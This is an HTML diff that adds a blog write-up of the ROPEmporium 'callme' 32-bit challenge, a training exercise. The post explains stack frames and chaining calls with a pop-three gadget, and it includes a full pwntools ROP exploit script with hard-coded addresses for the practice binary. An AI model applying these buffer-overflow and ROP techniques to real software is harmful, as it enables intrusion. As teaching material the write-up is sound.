@@ -7,8 +7,8 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="author" content="cavefxa" />
-  <meta property="og:url" content="https://cavefxa.com/categories/" />
-  <link rel="canonical" href="https://cavefxa.com/categories/" /><link rel="alternate" type="application/atom+xml" href="https://cavefxa.comindex.xml" title="cavefxa">
+  <meta property="og:url" content="https://cavefxa.com/archived/callme32/" />
+  <link rel="canonical" href="https://cavefxa.com/archived/callme32/" /><link rel="alternate" type="application/atom+xml" href="https://cavefxa.comindex.xml" title="cavefxa">
 
   <script type="application/ld+json">
   {
@@ -18,28 +18,32 @@
            "@type": "WebPage",
            "@id": "https:\/\/cavefxa.com"
       },
-      "articleSection" : "categories",
-      "name" : "Categories",
-      "headline" : "Categories",
-      "description" : "",
+      "articleSection" : "archived",
+      "name" : "ROPEmporium: callme 32-bit",
+      "headline" : "ROPEmporium: callme 32-bit",
+      "description" : "Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won\u0026rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.\nThis is the information we\u0026rsquo;re greeted with in the callme challenge.\nWhat we need to do is call the functions \u0026ldquo;callmeone\u0026rdquo;, \u0026ldquo;callmetwo\u0026rdquo;, \u0026ldquo;callmethree\u0026rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.",
       "inLanguage" : "en-US",
       "author" : "cavefxa",
       "creator" : "cavefxa",
       "publisher": "cavefxa",
       "accountablePerson" : "cavefxa",
       "copyrightHolder" : "cavefxa",
-      "copyrightYear" : "0001",
-      "datePublished": "0001-01-01 00:00:00 \u002b0000 UTC",
-      "dateModified" : "0001-01-01 00:00:00 \u002b0000 UTC",
-      "url" : "https:\/\/cavefxa.com\/categories\/",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-05-24 14:57:00 \u002b0200 CEST",
+      "dateModified" : "2021-05-24 14:57:00 \u002b0200 CEST",
+      "url" : "https:\/\/cavefxa.com\/archived\/callme32\/",
       "keywords" : [  ]
   }
 </script>
-<title>Categories</title>
-  <meta property="og:title" content="Categories" />
+<title>ROPEmporium: callme 32-bit</title>
+  <meta property="og:title" content="ROPEmporium: callme 32-bit" />
   <meta property="og:type" content="article" />
-  <meta property="og:description" content="" />
-  <meta name="description" content="" />
+  <meta property="og:description" content="Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won&amp;rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.
+This is the information we&amp;rsquo;re greeted with in the callme challenge.
+What we need to do is call the functions &amp;ldquo;callmeone&amp;rdquo;, &amp;ldquo;callmetwo&amp;rdquo;, &amp;ldquo;callmethree&amp;rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d." />
+  <meta name="description" content="Writeup of callme [callme] on ROPEmporium How do you make consecutive calls to a function from your ROP chain that won&amp;rsquo;t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.
+This is the information we&amp;rsquo;re greeted with in the callme challenge.
+What we need to do is call the functions &amp;ldquo;callmeone&amp;rdquo;, &amp;ldquo;callmetwo&amp;rdquo;, &amp;ldquo;callmethree&amp;rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d." />
   <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
   
 
@@ -66,10 +70,11 @@
 
 
 <body>
-  <article class="posts">
+  <article class="post " id="article">
     <div class="row">
       <div class="col-xs-12">
-        
+        <div class="site-header">
+          
 <header>
   <div class="header-title">
     <a href="/"
@@ -90,11 +95,126 @@
 </div>
 <div class="header-line"></div>
 
-
-        <h1 class="taxonomy-term"></h1>
-        <div id="posts-list">
-          
         </div>
+        <header class="post-header">
+          <h1 class="post-title">ROPEmporium: callme 32-bit</h1>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h1 id="writeup-of-callme-callme-on-ropemporium">Writeup of callme [callme] on ROPEmporium</h1>
+<p>How do you make consecutive calls to a function from your ROP chain that won&rsquo;t crash afterwards?
+If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.</p>
+<p>This is the information we&rsquo;re greeted with in the callme challenge.</p>
+<p>What we need to do is call the functions &ldquo;callmeone&rdquo;, &ldquo;callmetwo&rdquo;, &ldquo;callmethree&rdquo; all with the same arguments: 0xdeadbeef, 0xcafebabe, 0xd00df00d.</p>
+<p>Let&rsquo;s look at the binary with radare2:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>&gt;  0x08048570   50 entry0                                   
+</span></span><span style="display:flex;"><span>   0x080486ed   98 sym.pwnme
+</span></span><span style="display:flex;"><span>   0x080484c0    6 sym.imp.read
+</span></span><span style="display:flex;"><span>   0x0804874f   67 sym.usefulFunction
+</span></span><span style="display:flex;"><span>   0x080484e0    6 sym.imp.callme_three &lt;- Call_three
+</span></span><span style="display:flex;"><span>   0x08048550    6 sym.imp.callme_two &lt;- Call_two
+</span></span><span style="display:flex;"><span>   0x080484f0    6 sym.imp.callme_one &lt;- Call_one
+</span></span><span style="display:flex;"><span>   0x08048686  103 main
+</span></span></code></pre></div><p>Okay! So this should be easy. Let&rsquo;s look at the stack we want.</p>
+<pre tabindex="0"><code>┌────────────┐
+│            │
+│ 0xd00df00d │
+│            │
+├────────────┤
+│            │
+│ 0xcafebabe │
+│            │
+├────────────┤
+│            │
+│ 0xdeadbeef │
+│            │
+├────────────┤
+│            │
+│ callme_one │
+│            │
+└────────────┘
+</code></pre><p>Now how do we continue with the next callme_two? Just the same principle? Is this even right?
+I tried a payload that went something like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload=padding
+</span></span><span style="display:flex;"><span>payload+=callme_one+dead+cafe+dood
+</span></span><span style="display:flex;"><span>payload+=callme_two+dead+cafe+dood
+</span></span><span style="display:flex;"><span>payload+=callme_three+dead+cafe+dood
+</span></span></code></pre></div><p>It&rsquo;s important to note, that when a function call is made a new <strong>stack frame</strong> is created. This is to avoid corrupting data outisde a function, and also to save memory. Let&rsquo;s look at a simple python program that explains this quite well:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> test():
+</span></span><span style="display:flex;"><span>    a = 10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> main():
+</span></span><span style="display:flex;"><span>    print(a)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>test()
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div><p>This would yield a &ldquo;NameError: name &lsquo;a&rsquo; is not defined&rdquo;. To return from a function, it&rsquo;s important that the function has a return address. The return address is the first thing that will be pushed onto the stack after a function call.</p>
+<p>We simply need some sort of way to return back after our function. It&rsquo;s also important to note, that we push data on to the stack, that shouldn&rsquo;t be there in the first place, this can cause issues when returning, as the program might interpret these in a different way then. We simply make our chain like this:</p>
+<pre tabindex="0"><code>payload = callme_one+pop3+argv1+argv2+argv3
+payload += callme_two+pop3+argv1+argv2+argv3
+payload += callme_three+argv1+argv2+argv3
+</code></pre><p>This firstly puts the pop3 as the return address after the function has been called. So it calls callme_one with the three arguments, then returns to pop3 which places these into registers, and removes them from the stack. Then it calls the next function, with the three arguments and afterwards places these into registers, effectively removing them from the stack. Lastly it calls callme_three and&hellip; flag</p>
+<p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>usefulFunction = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;</span><span style="color:#a31515">\x4f\x87\x04\x08</span><span style="color:#a31515">&#34;</span>
+</span></span><span style="display:flex;"><span>callmeone = p32(0x08048780) <span style="color:#008000">#b&#34;\x80\x87\x04\x08&#34;</span>
+</span></span><span style="display:flex;"><span>callme_one_plt = p32(0x080484f0)
+</span></span><span style="display:flex;"><span>callme_two_plt = p32(0x08048550)
+</span></span><span style="display:flex;"><span>callmethree = p32(0x0804875e)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dbef = p32(0xdeadbeef)
+</span></span><span style="display:flex;"><span>cfbb = p32(0xcafebabe)
+</span></span><span style="display:flex;"><span>dfd = p32(0xd00df00d)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>completeargv=dbef+cfbb+dfd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdgtpopm = p32(0x080487f9) <span style="color:#008000">#pops three registers</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elfPath=<span style="color:#a31515">&#34;./callme32&#34;</span>
+</span></span><span style="display:flex;"><span>context.arch=<span style="color:#a31515">&#34;i386&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript=<span style="color:#a31515">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">break *0x080484f0
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>terminalSetting = [<span style="color:#a31515">&#39;gnome-terminal&#39;</span>, <span style="color:#a31515">&#39;-e&#39;</span>]
+</span></span><span style="display:flex;"><span>context.clear(terminal=terminalSetting)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#008000">#mnm = cyclic_gen()</span>
+</span></span><span style="display:flex;"><span><span style="color:#008000">#mnm = mnm.get(80)</span>
+</span></span><span style="display:flex;"><span>point=cyclic_find(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;laaa&#34;</span>, endian=<span style="color:#a31515">&#34;little&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#008000">#6161616c is at the return or laaa</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#008000">#https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> main():
+</span></span><span style="display:flex;"><span>    print(io.recvuntil(<span style="color:#a31515">&#34;&gt; &#34;</span>))
+</span></span><span style="display:flex;"><span>    payload=<span style="color:#a31515">b</span><span style="color:#a31515">&#34;A&#34;</span>*point
+</span></span><span style="display:flex;"><span>    payload+=callme_one_plt+gdgtpopm+completeargv
+</span></span><span style="display:flex;"><span>    payload+=callme_two_plt+gdgtpopm+completeargv  
+</span></span><span style="display:flex;"><span>    payload+=callmethree+completeargv  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    io.send(payload)
+</span></span><span style="display:flex;"><span>    io.interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
 
         <div class="site-footer">
   
@@ -114,6 +234,8 @@
     
   
 </script>
+
+  
 
 </body>
 
